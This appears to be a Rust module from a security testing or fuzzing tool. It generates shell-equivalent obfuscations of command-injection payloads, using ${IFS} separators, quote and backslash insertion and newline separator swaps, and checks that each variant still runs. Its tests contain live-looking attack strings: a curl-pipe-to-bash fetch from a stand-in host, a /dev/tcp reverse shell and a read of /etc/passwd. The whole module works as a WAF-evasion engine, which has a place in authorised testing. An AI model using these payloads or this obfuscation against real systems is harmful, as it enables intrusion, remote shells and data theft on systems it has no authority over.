//! Command-injection payload-string equivalence + the joint
//! `(payload × delivery)` generator — the cmdi arm of Phase B.
//!
//! Every rewrite is shell-parser-equivalent *by construction* (bash
//! resolves `c''at`, `c\at`, `${IFS}` to the exact same execution) and
//! every emitted member is re-verified ([`still_executes_cmd`]) to
//! still run the original command against its original target. Reuses
//! the `is_structured_cmd` chokepoint so a reverse shell / file-exfil
//! is never degraded to a bare `whoami` probe.

use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};
use crate::grammar::cmd::is_structured_cmd;

/// Bash word-separator equivalents — every one field-splits to a
/// single argument boundary at execution.
// Bare `$IFS` is UNSOUND: `wget$IFShttp` parses as the variable
// `$IFShttp` (undefined → empty), losing the separator. Only the
// brace-delimited / quoted forms are unambiguous everywhere.
const SEP_EQUIV: &[&str] = &[
    " ",
    "${IFS}",
    "\t",
    "${IFS%??}",
    "$'\\x20'",
    "$'\\t'",
    "${IFS}${IFS}",
];

fn sep_pick(rng: &mut Rng) -> String {
    (*rng.pick(SEP_EQUIV)).to_string()
}

/// Strip shell-transparent obfuscation so the candidate normalises
/// back to what actually executes (mirrors the WAF/shell view).
fn normalize(s: &str) -> String {
    let mut t = s.to_string();
    for ifs in [
        "${IFS%??}",
        "${IFS}${IFS}",
        "${IFS}",
        "$IFS",
        "$'\\x20'",
        "$'\\t'",
    ] {
        t = t.replace(ifs, " ");
    }
    // remove '' "" and backslash-before-ordinary (bash quote removal)
    let b: Vec<char> = t.chars().collect();
    let mut o = String::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if (b[i] == '\'' || b[i] == '"') && i + 1 < b.len() && b[i + 1] == b[i] {
            i += 2; // empty quote pair
            continue;
        }
        if b[i] == '\\' && i + 1 < b.len() && b[i + 1].is_ascii_alphanumeric() {
            o.push(b[i + 1]);
            i += 2;
            continue;
        }
        if b[i] == '$' && i + 1 < b.len() && b[i + 1] == '@' {
            i += 2; // $@ empty expansion
            continue;
        }
        o.push(b[i].to_ascii_lowercase());
        i += 1;
    }
    o.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn sig_tokens(norm: &str) -> Vec<String> {
    norm.split(|c: char| !c.is_ascii_alphanumeric() && c != '.' && c != '/' && c != '_')
        .filter(|t| t.len() >= 3)
        .map(str::to_string)
        .collect()
}

/// A shell-injection mechanism (separator / metachar / substitution)
/// or a structured effect. Without one the input is just prose, not a
/// command injection — the generator must emit nothing for it.
fn has_shell_context(s: &str) -> bool {
    if is_structured_cmd(s) {
        return true;
    }
    [
        ";", "|", "&", "`", "$(", "${", "\n", "\r", ">", "<", "%0a", "%0d", "$IFS",
    ]
    .iter()
    .any(|m| s.contains(m))
}

/// True iff `cand` provably still runs the original command + target.
#[must_use]
pub fn still_executes_cmd(original: &str, cand: &str) -> bool {
    if cand.trim().is_empty() || !has_shell_context(original) {
        return false;
    }
    let no = normalize(original);
    let nc = normalize(cand);
    if nc.is_empty() {
        return false;
    }
    if is_structured_cmd(original) {
        // The operator's command verb AND its target/host/effect must
        // survive (anti-rig: never substitute a bare probe).
        let want = sig_tokens(&no);
        if want.is_empty() {
            return true;
        }
        want.iter().all(|t| nc.contains(t.as_str()))
    } else {
        // Bare exec probe: the command verb must survive.
        let first = no.split_whitespace().next().unwrap_or("");
        !first.is_empty() && nc.contains(first)
    }
}

// ── rewrites (bash-equivalent) ─────────────────────────────────────

/// Replace inter-token spaces with field-split equivalents.
fn rw_sep(s: &str, rng: &mut Rng) -> String {
    let mut out = String::with_capacity(s.len() + 8);
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == ' ' {
            // collapse a run of spaces → one equivalent separator
            while chars.peek() == Some(&' ') {
                chars.next();
            }
            out.push_str(&sep_pick(rng));
        } else {
            out.push(c);
        }
    }
    out
}

/// Obfuscate the FIRST command word with a bash-transparent form
/// (quote/backslash/`$@` insertion) — same binary resolved.
fn rw_cmd_obf(s: &str, rng: &mut Rng) -> Option<String> {
    let trimmed_start = s.len() - s.trim_start().len();
    let rest = &s[trimmed_start..];
    // command word = leading run of [A-Za-z0-9_/.-] (skip a leading
    // separator like ';' '|' '&').
    let bytes = rest.as_bytes();
    let mut i = 0;
    while i < bytes.len()
        && (bytes[i] == b';'
            || bytes[i] == b'|'
            || bytes[i] == b'&'
            || bytes[i] == b' '
            || bytes[i] == b'\n')
    {
        i += 1;
    }
    let st = i;
    while i < bytes.len()
        && (bytes[i].is_ascii_alphanumeric()
            || bytes[i] == b'/'
            || bytes[i] == b'.'
            || bytes[i] == b'-'
            || bytes[i] == b'_')
    {
        i += 1;
    }
    if i - st < 2 {
        return None;
    }
    let word = &rest[st..i];
    let cut = 1 + rng.below(word.len() - 1);
    let (l, r) = word.split_at(cut);
    let obf = match rng.below(4) {
        0 => format!("{l}''{r}"),
        1 => format!("{l}\\{r}"),
        2 => format!("{l}\"\"{r}"),
        _ => format!("{l}$@{r}"),
    };
    let mut out = String::with_capacity(s.len() + 4);
    out.push_str(&s[..trimmed_start]);
    out.push_str(&rest[..st]);
    out.push_str(&obf);
    out.push_str(&rest[i..]);
    Some(out)
}

/// `;` ↔ newline are unconditionally-equivalent statement separators
/// (NOT `&&`/`||` — those are conditional). Swap a leading `;`.
fn rw_separator(s: &str, rng: &mut Rng) -> Option<String> {
    let t = s.trim_start();
    let lead = s.len() - t.len();
    if let Some(rest) = t.strip_prefix(';') {
        let repl = if rng.chance(1, 2) { "\n" } else { "%0a" };
        return Some(format!("{}{repl}{rest}", &s[..lead]));
    }
    None
}

// ── generator ──────────────────────────────────────────────────────

#[must_use]
pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    let mut rng = Rng::new(cfg.seed);
    let all = super::sql::delivery_set(&cfg.param);
    let (deliveries, single_forced) = match cfg.force_delivery {
        Some(i) if i < all.len() => (vec![all[i].clone()], true),
        _ => (all, false),
    };
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out: Vec<EquivPayload> = Vec::new();

    if !still_executes_cmd(payload, payload) {
        return out;
    }

    for d in &deliveries {
        if !cfg.vary_delivery && !single_forced && !matches!(d, DeliveryShape::Query { .. }) {
            continue;
        }
        let key = format!("{}\u{1}{}", payload, d.label());
        if seen.insert(key) {
            out.push(EquivPayload {
                payload: payload.to_string(),
                delivery: d.clone(),
                dialect: Dialect::Generic,
                rules: vec!["identity"],
            });
        }
    }

    let mut attempts = 0;
    while out.len() < cfg.max && attempts < cfg.max * 24 + 64 {
        attempts += 1;
        let mut s = payload.to_string();
        let mut rules: Vec<&'static str> = Vec::new();
        if rng.chance(4, 5) {
            let n = rw_sep(&s, &mut rng);
            if n != s {
                s = n;
                rules.push("ifs_sep");
            }
        }
        if rng.chance(3, 5) {
            if let Some(n) = rw_cmd_obf(&s, &mut rng) {
                s = n;
                rules.push("cmd_obfuscate");
            }
        }
        if rng.chance(1, 3) {
            if let Some(n) = rw_separator(&s, &mut rng) {
                s = n;
                rules.push("separator_equiv");
            }
        }
        if rules.is_empty() {
            continue;
        }
        if !still_executes_cmd(payload, &s) {
            continue;
        }
        let d = if cfg.vary_delivery || single_forced {
            rng.pick(&deliveries).clone()
        } else {
            DeliveryShape::Query {
                param: cfg.param.clone(),
            }
        };
        let key = format!("{s}\u{1}{}", d.label());
        if !seen.insert(key) {
            continue;
        }
        out.push(EquivPayload {
            payload: s,
            delivery: d,
            dialect: Dialect::Generic,
            rules,
        });
    }
    super::enforce_transport_legal(&mut out);
    out.truncate(cfg.max);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(seed: u64) -> EquivConfig {
        EquivConfig {
            seed,
            max: 48,
            verify: true,
            vary_delivery: true,
            param: "q".into(),
            force_delivery: None,
        }
    }

    #[test]
    fn structured_attack_keeps_command_and_target() {
        let atk = "; curl http://evil.tld/s|bash";
        let v = generate(atk, &cfg(5));
        assert!(!v.is_empty());
        for m in &v {
            assert!(
                still_executes_cmd(atk, &m.payload),
                "unsound {:?}",
                m.payload
            );
            let nc = normalize(&m.payload);
            assert!(
                nc.contains("curl") && nc.contains("evil.tld"),
                "lost command/target: {:?}",
                m.payload
            );
        }
    }

    #[test]
    fn ifs_and_quote_obfuscation_normalize_back() {
        assert_eq!(normalize("c''a\\t${IFS}/etc/passwd"), "cat /etc/passwd");
        assert!(still_executes_cmd(
            "; cat /etc/passwd",
            "; c''at${IFS}/etc/passwd"
        ));
    }

    #[test]
    fn never_substitutes_a_bare_probe_for_a_reverse_shell() {
        let atk = "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        for m in generate(atk, &cfg(11)) {
            assert!(m.payload != "whoami" && m.payload != "id");
            let nc = normalize(&m.payload);
            assert!(nc.contains("/dev/tcp") && nc.contains("10.0.0.1"));
        }
    }

    #[test]
    fn non_cmd_and_empty_emit_nothing() {
        assert!(generate("", &cfg(1)).is_empty());
        assert!(generate("the quick brown fox", &cfg(1)).is_empty());
    }

    #[test]
    fn deterministic_per_seed() {
        let a: Vec<_> = generate("; cat /etc/passwd", &cfg(4))
            .into_iter()
            .map(|m| (m.payload, m.delivery.label()))
            .collect();
        let b: Vec<_> = generate("; cat /etc/passwd", &cfg(4))
            .into_iter()
            .map(|m| (m.payload, m.delivery.label()))
            .collect();
        assert_eq!(a, b);
    }

    #[test]
    fn diverse_equivalents_produced() {
        let v = generate("; cat /etc/passwd", &cfg(8));
        let d: std::collections::HashSet<_> = v.iter().map(|m| &m.payload).collect();
        assert!(d.len() >= 6, "too few distinct: {}", d.len());
    }
}
